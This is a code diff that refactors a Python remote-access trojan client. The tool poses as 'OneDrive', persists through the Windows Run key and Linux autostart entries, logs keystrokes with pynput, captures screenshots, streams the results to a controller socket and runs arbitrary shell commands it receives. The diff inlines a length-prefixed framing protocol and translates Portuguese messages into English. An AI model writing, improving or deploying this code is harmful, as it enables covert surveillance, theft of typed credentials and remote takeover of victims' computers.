@@ -4,12 +4,12 @@ import socket
 import subprocess
 import sys
 import platform
+import struct
 import io
 from datetime import datetime
 from time import sleep
 from pynput import keyboard
 from PIL import ImageGrab
-import protocolo
 
 IS_WINDOWS = os.name == "nt"
 if IS_WINDOWS:
@@ -17,7 +17,6 @@ if IS_WINDOWS:
 
 IP = "127.0.0.1"
 PORT = 443
-SOCKET_TIMEOUT = 1.0
 
 PROGRAM_NAME = "OneDrive"
 REGISTRY_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -61,31 +60,31 @@ def get_keylog_data():
     if not keylog_buffer:  
         return ""  
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  
-    data = f"[+] Keylog capturado em {timestamp}:\n{''.join(keylog_buffer)}\n"  
+    data = f"[+] Keylog captured at {timestamp}:\n{''.join(keylog_buffer)}\n"
     keylog_buffer = []  
     return data
 
 def start_keylogger():
     global keylogger_active, listener
     if keylogger_active:  
-        return "[i] Capturador já se encontra em execução\n"  
+        return "[i] Keylogger is already active\n"  
     try:
         listener = keyboard.Listener(on_press=on_press)  
         listener.start()  
         keylogger_active = True  
-        return "[+] Instância de captura iniciada\n"
+        return "[+] Keylogger started\n"
     except Exception as e:
-        return f"[-] Erro ao iniciar subsistema pynput: {type(e).__name__} -> {e}\n"
+        return f"[-] Error starting listener: {type(e).__name__} -> {e}\n"
 
 def stop_keylogger():
     global keylogger_active, listener
     if not keylogger_active:  
-        return "[i] Nenhuma instância ativa encontrada.\n"  
+        return "[i] Keylogger not running.\n"  
     if listener is not None:  
         listener.stop()  
         listener = None  
     keylogger_active = False  
-    return "[+] Capturador finalizado.\n"
+    return "[+] Keylogger stopped.\n"
 
 def capture_screenshot():
     try:
@@ -94,7 +93,7 @@ def capture_screenshot():
         screenshot.save(img_byte_arr, format='PNG')
         return img_byte_arr.getvalue()
     except Exception as e:
-        return f"[-] Erro na captura de tela via ImageGrab: {type(e).__name__} -> {e}".encode('utf-8')
+        return f"[-] Screenshot error: {type(e).__name__} -> {e}".encode("utf-8")
 
 def copy_system_file():
     try:
@@ -116,7 +115,7 @@ def copy_system_file():
             return destination  
         return current_file  
     except OSError as e:
-        print(f"[-] Falha na cópia de persistência em disco: {e}")
+        print(f"[-] Disk operations error: {e}")
         return os.path.abspath(sys.argv[0])
 
 def check_persistence():
@@ -149,34 +148,54 @@ def setup_persistence():
             with open(DESKTOP_FILE_PATH, "w") as f:
                 f.write(desktop_entry)
     except (OSError, PermissionError) as e:  
-        print(f"[-] Erro ao configurar chaves/arquivos de autostart: {e}")
+        print(f"[-] Persistence failure: {e}")
+
+def enviar_dados_estruturados(client_socket, dados_brutos):
+    try:
+        cabecalho = struct.pack(">I", len(dados_brutos))
+        client_socket.sendall(cabecalho + dados_brutos)
+    except socket.error as e:
+        raise OSError(f"Network stream failure: {e}")
+
+def receber_bytes_exatos(sock, tamanho_esperado):
+    dados_acumulados = b""
+    while len(dados_acumulados) < tamanho_esperado:
+        pacote = sock.recv(tamanho_esperado - len(dados_acumulados))
+        if not pacote:
+            raise ConnectionResetError("Conexão fechada pelo servidor.")
+        dados_acumulados += pacote
+    return dados_acumulados
+
+def ler_mensagem_do_protocolo(sock):
+    bytes_do_tamanho = receber_bytes_exatos(sock, 4)
+    tamanho_do_payload = struct.unpack(">I", bytes_do_tamanho)[0]
+    payload_bruto = receber_bytes_exatos(sock, tamanho_do_payload)
+    return payload_bruto
 
 def connect(ip, port):
     try:
         c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         c.connect((ip, port))
-        protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, "[#] Cliente conectado com sucesso\n".encode('utf-8'))
+        enviar_dados_estruturados(c, "[#] Client connected\n".encode("utf-8"))
         return c
     except OSError as e:
-        print(f"[-] Tentativa de conexão falhou para {ip}:{port}: {e}")
+        print(f"[-] Connection failed to {ip}:{port}: {e}")
         return None
 
 def listen(c):
     global buffer_auto_send_pending
-    c.settimeout(SOCKET_TIMEOUT)
+    c.settimeout(1.0)
     while True:
         try:
             if buffer_auto_send_pending:
                 data = get_keylog_data()
                 if data:
-                    protocolo.enviar_mensagem(c, protocolo.MSG_KEYLOG, data.encode('utf-8'))
+                    enviar_dados_estruturados(c, data.encode("utf-8"))
                 buffer_auto_send_pending = False
 
             try:
-                tipo, payload = protocolo.ler_mensagem(c)
-                if tipo != protocolo.MSG_TEXTO:
-                    continue
-                command = payload.decode('utf-8').strip()
+                payload = ler_mensagem_do_protocolo(c)
+                command = payload.decode("utf-8").strip()
                 if not command:
                     continue
             except socket.timeout:
@@ -186,33 +205,30 @@ def listen(c):
                 break
             elif command == "/screenshot":
                 img_data = capture_screenshot()
-                protocolo.enviar_mensagem(c, protocolo.MSG_IMAGEM, img_data)
+                enviar_dados_estruturados(c, img_data)
             elif command == "/keylog_start":
                 res = start_keylogger()
-                protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, res.encode('utf-8'))
+                enviar_dados_estruturados(c, res.encode("utf-8"))
             elif command == "/keylog_dump":
                 res = get_keylog_data()
                 if not res:
-                    res = "[i] Log temporário está vazio\n"
-                protocolo.enviar_mensagem(c, protocolo.MSG_KEYLOG, res.encode('utf-8'))
+                    res = "[i] Keylog buffer empty\n"
+                enviar_dados_estruturados(c, res.encode("utf-8"))
             elif command == "/keylog_stop":
                 res = stop_keylogger()
-                protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, res.encode('utf-8'))
+                enviar_dados_estruturados(c, res.encode("utf-8"))
             else:
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 stdout, stderr = proc.communicate()
                 output = stdout + stderr
                 if not output:
-                    output = b"[+] Comando executado sem retorno textual de saida\n"
-                protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, output)
-        except RuntimeError as e:
-            print(f"[-] Desconexão por falha estrutural de protocolo: {e}")
+                    output = b"[+] Command executed (No output)\n"
+                enviar_dados_estruturados(c, output)
+        except RuntimeError as e_run:
+            print(f"[-] Protocol state error: {e_run}")
             break
-        except OSError as e:
-            print(f"[-] Falha operacional de rede encontrada na sessão: {e}")
-            break
-        except Exception as e:
-            print(f"[!] Erro inesperado capturado no loop operacional: {type(e).__name__} -> {e}")
+        except OSError as e_os:
+            print(f"[-] Socket state error: {e_os}")
             break
 
 def main():
